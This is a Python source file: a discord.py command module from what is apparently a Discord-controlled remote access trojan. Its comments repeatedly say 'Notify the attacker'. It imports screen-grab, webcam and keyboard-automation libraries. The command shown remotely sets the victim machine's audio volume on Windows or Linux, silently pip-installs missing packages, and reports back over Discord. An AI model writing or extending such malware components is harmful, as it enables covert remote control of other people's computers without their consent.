import getpass
import os
import platform
import pwd
import re
import socket
import textwrap
import uuid
from datetime import datetime
from PIL import ImageGrab
from functools import partial
import discord
import psutil
import requests
import pyautogui
import cv2
import asyncio
import time
import random
import string
import webbrowser
from discord.ext import commands

from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from ctypes import POINTER, cast
import subprocess


class Others(commands.Cog, description="System Information"):

    def __init__(self, client: commands.Bot):
        self.client = client

    @commands.command()
    async def volume(self, ctx, value, mode="+"):
        """
        If target is Windows:
            Usage:
                >volume <mode> 

            Examples:
                >volume +
                >volume increase

            Parameters:
                <mode>
                    +
                    p
                    plus
                    i
                    inc
                    increase
                    a
                    add

        If target is NOT Windows (Linux):
            Usage:
                >volume <value>

            Example:
                >volume 30

            Parameters:
                <value>
                    0...100
        """
        try:
            if os.name == 'nt':
                # Handle imports properly
                # Install if ImportError
                try:
                    try:
                        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    except:
                        os.system("py -m pip install -U pycaw")
                    try:
                        from comtypes import CLSCTX_ALL
                    except:
                        os.system("py -m pip install -U comtypes")
                    try:
                        from ctypes import POINTER, cast
                    except:
                        os.system("py -m pip install -U ctypes")
                finally:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    from comtypes import CLSCTX_ALL
                    from ctypes import POINTER, cast

                # Increase the volume
                if value in ("+", "p", "i", "inc", "increase", "add", "a", "plus") or mode in ("+", "p", "i", "inc", "increase", "add", "a", "plus"):
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(
                        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    if volume.GetMute() == 1:
                        volume.SetMute(0, None)
                    volume.SetMasterVolumeLevel(
                        volume.GetVolumeRange()[1], None)
                    custom_desc = "Increased Volume"

                # Decrease the volume
                else:
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(
                        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume.SetMasterVolumeLevel(
                        volume.GetVolumeRange()[0], None)
                    custom_desc = "Decreased Volume"

                # Notify the attacker
                embed = discord.Embed(
                    title=f"Volume Control",
                    description=custom_desc,
                    timestamp=datetime.utcnow(),
                    color=0xFF5733
                )
                embed.set_footer(
                    text=f'Requested by {ctx.author.name}',
                    icon_url=ctx.author.avatar_url
                )
                await ctx.send(embed=embed)

            else:
                try:
                    # Run a system command
                    subprocess.Popen(["amixer", "-D", "pulse", "sset",
                                      "Master", str(value) + "%"], stdout=subprocess.PIPE)
                except:
                    # Set volume with a python3 library
                    # Import library. Install if error
                    try:
                        import alsaaudio as audio
                    except:
                        os.system("python3 -m pip install -U pyalsaaudio")
                    mixer = audio.Mixer('Headphone', cardindex=1)
                    mixer.setvolume(int(value))

                # Notify the attacker
                embed = discord.Embed(
                    title=f"Volume Control",
                    description=f"Set volume to {value}",
                    timestamp=datetime.utcnow(),
                    color=0xFF5733
                )
                embed.set_footer(
                    text=f'Requested by {ctx.author.name}',
                    icon_url=ctx.author.avatar_url
                )
                await ctx.send(embed=embed)

        except Exception as e:
            await ctx.send(str(e))
            return


def setup(client: commands.Bot):
    client.add_cog(Others(client))
